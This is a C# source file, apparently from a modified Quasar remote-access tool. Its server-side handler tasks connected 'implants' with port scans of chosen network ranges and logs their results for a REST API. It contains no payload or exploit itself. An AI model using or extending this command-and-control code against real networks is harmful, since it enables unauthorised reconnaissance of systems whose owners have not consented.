using Quasar.Common.Logger;
using Quasar.Common.Messages;
using Quasar.Common.Networking;
using Quasar.Server.Networking;
using Quasar.Server.Tasking;
using System;
using System.Linq;
using System.Threading.Tasks;

namespace Quasar.Server.Messages
{
    public class PortScanHandler : MessageProcessorBase<String>
    {
        /// <summary>
        /// The client which is associated with this port scan handler.
        /// </summary>
        private readonly Client _client;

        public PortScanHandler(Client client, bool viaRestApi = false) : base(true, viaRestApi)
        {
            _client = client;
        }

        public override bool CanExecute(IMessage message) => message is DoPortScanResponse;

        public override bool CanExecuteFrom(ISender sender) => _client.Equals(sender);

        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case DoPortScanResponse scanResp:
                    Execute(sender, scanResp);
                    break;
            }
        }

        public string StartPortScan(string cidr, int[] ports)
        {
            DoPortScan task = ImplantTaskManager.CreateAndRegisterPortScanTask(cidr, ports);
            Logger.Info(String.Format(
                "Created and registered new PortScan task with ID {0}, range {1} and ports {2}",
                task.TaskId,
                task.TargetRange,
                String.Join(", ", ports)
            ));
            _client.Send(task);
            return task.TaskId;
        }

        private void Execute(ISender client, DoPortScanResponse message)
        {
            // save the scan information in dictionary so REST API can pick it up later
            Logger.Debug("Handling DoPortScanResponse message with task ID " + message.TaskId);
            ImplantTaskManager.RegisterPortScanTaskResponse(message);
        }
    }
}
